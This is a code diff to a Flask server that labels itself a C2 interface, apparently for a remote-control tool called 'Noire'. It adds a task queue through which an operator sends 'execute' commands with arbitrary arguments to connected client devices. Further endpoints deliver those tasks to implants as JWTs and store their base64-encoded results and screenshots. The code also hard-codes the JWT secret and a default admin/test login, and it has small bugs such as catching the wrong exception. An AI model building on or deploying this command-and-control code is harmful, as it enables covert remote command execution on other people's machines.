@@ -4,6 +4,7 @@ import flask_login
 import os
 import secrets
 import bcrypt
+import base64
 import jwt
 from eventlet import wsgi, listen
 
@@ -20,9 +21,9 @@ class User(db.Model):
 
     username = db.Column(db.String, primary_key=True)
     password = db.Column(db.String)
-    salt = db.Column(db.String)
     authenticated = db.Column(db.Boolean, default=False)
     groups = db.Column(db.String, default='users')
+    permissions = db.Column(db.String)
 
     def is_active(self):
         """True, as all users are active."""
@@ -46,12 +47,7 @@ class Group(db.Model):
     
     id = db.Column(db.Integer, primary_key=True)
     name = db.Column(db.String)
-    
-    def get_id(self):
-        return self.id
-    
-    def get_name(self):
-        return self.name
+    permissions = db.Column(db.String)
     
 class Device(db.Model):
     """A Device connected to the server
@@ -71,20 +67,19 @@ class Device(db.Model):
     uniquePath = db.Column(db.String)
     taskPath = db.Column(db.String)
     responsePath = db.Column(db.String)
-    
-    def get_id(self):
-        return self.id
-    
-    def get_os(self):
-        return self.os
 
-'''userTable = db.Table(
-    'users',
-    sa.Column('username', sa.String, primary_key=True),
-    sa.Column('password', sa.String),
-    sa.Column('authenticated', sa.Boolean),
-    sa.Column('groups', sa.String)
-)'''
+class Task(db.Model):
+    """A task requested for a client to run
+    """
+    
+    __tablename__ = "tasks"
+    
+    id = db.Column(db.String, primary_key=True)
+    owner = db.Column(db.String)
+    command = db.Column(db.String)
+    arguments = db.Column(db.String)
+    running = db.Column(db.Boolean, default=False)
+    response = db.Column(db.String, default='NOTRUN')
 
 db.init_app(app)
 with app.app_context():
@@ -148,8 +143,8 @@ with app.app_context():
     a = addAccount('admin', 'test', True)
     a = None
     #Delete all known links for devices, so new can be generated
-    if Device.query.get('%'):
-        for dev in Device.query.get('%'):
+    if Device.query.all():
+        for dev in Device.query.all():
             dev.uniquePath, dev.taskPath, dev.responsePath = '', '', ''
 
 @app.errorhandler(404)
@@ -207,7 +202,27 @@ def logoutPage():
 @app.route('/overview')
 @flask_login.login_required
 def overviewPage():
-    return flask.render_template('overview.html', user = flask_login.current_user.username)
+    devAmount = 0
+    if Device.query.all():
+        devAmount = len(Device.query.all())
+    return flask.render_template('overview.html', user = flask_login.current_user.username, devices = devAmount)
+
+@app.route('/clients', methods=['GET', 'POST'])
+@flask_login.login_required
+def clientsPage():
+    if flask.request.method == 'GET':
+        return flask.render_template('clients.html', clients = Device.query.all())
+    else:
+        if Device.query.filter_by(jwt=flask.request.form['jwt']).all():
+            print('found')
+            if flask.request.form['action'] == 'execute':
+                task = Task(id=generateRandPath(), owner=flask.request.form['jwt'],
+                            command='execute', arguments=flask.request.form['arguments'])
+                db.session.add(task)
+                db.session.commit()
+            flask.flash('Command executed')#doesnt show because redirect, show on load template?
+            return flask.render_template('clients.html', clients = Device.query.all())
+        return flask.render_template('clients.html', clients = Device.query.all())
 
 #C2 interface
 def validateC2Client(request:flask.request) -> bool:
@@ -238,7 +253,7 @@ def generateRandPath() -> str:
 def contactC2Page():
     if not validateC2Client(flask.request): return not_found('Invalid')
     jwT = flask.request.headers['NClient-Token']
-    if not Device.query.get(jwT):
+    if not Device.query.filter_by(jwt=jwT).all():
         token = jwt.decode(jwT, 'Noire', algorithms=["HS256"])
         uP, tP, rP = generateRandPath(), generateRandPath(), generateRandPath()
         newClient = Device(jwt=jwT, ip=token['ip'], os=token['os'], user=token['user'],
@@ -247,7 +262,7 @@ def contactC2Page():
         db.session.add(newClient)
         db.session.commit()
     else:
-        a = Device.query.get(jwT)
+        a = Device.query.filter_by(jwt=jwT).all()[0]
         uP, tP, rP = a.uniquePath, a.taskPath, a.responsePath
     resp = flask.make_response("")
     resp.headers['NClient-Path'], resp.headers['NClient-TaskPath'], resp.headers['NClient-ResponsePath'] = uP, tP, rP
@@ -258,15 +273,41 @@ def contactC2Page():
 def instructReponsePages(c2ID:str, pName:str):
     if not validateC2Client(flask.request): return not_found("Invalid")
     jwT = flask.request.headers['NClient-Token']
-    gjwT = Device.query.get(jwT)
-    if not gjwT: return not_found("Skipped initialisation")#if not in the system, something is fishy
+    try:
+        gjwT = Device.query.filter_by(jwt=jwT).all()[0]
+    except KeyError:
+        return not_found("Skipped initialisation")#if not in the system, something is fishy
     if c2ID != gjwT.uniquePath: return not_found("Bad unique path")
     if pName != gjwT.taskPath and pName != gjwT.responsePath: return not_found("Bad type path")
     if pName == gjwT.taskPath:
         if flask.request.method != "GET": return not_found("Bad method on control path")
-        #return enc task content
+        tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN')
+        if not tasks: return not_found("No tasks")
+        tR = []
+        for task in tasks:
+            tR.append(jwt.encode({'id': task.id, 'command': task.command, 'args': task.arguments}, 'Noire'))#allow this to be modified
+            task.running = True
+        db.session.commit()
+        return '\n'.join(tR)
     else:
         if flask.request.method != "POST": return not_found("Bad method on control path")
+        try:
+            task = flask.request.headers['NClient-TaskResponse']
+        except KeyError:
+            return not_found("No finished task")#flag this in logs
+        task = base64.b64decode(task).split(b'*')
+        taskID = task[0].decode(); taskResponse = task[1]
+        setTask = Task.query.filter_by(owner=jwT, id=taskID).all()
+        if not setTask: return not_found('No task with ID')#flag this in logs
+        setTask = setTask[0]
+        setTask.running = False
+        if setTask.command == 'screenshot':
+            setTask.response = taskResponse
+        setTask.response = base64.b64encode(taskResponse)
+        db.session.commit()
+        tasks = Task.query.filter_by(owner=jwT, running=False, response='NOTRUN').all()
+        if not tasks: return ""
+        else: return flask.redirect(f'/c/{gjwT.uniquePath}/{gjwT.taskPath}')
 
 #Run forever
 def start_server(port:int):
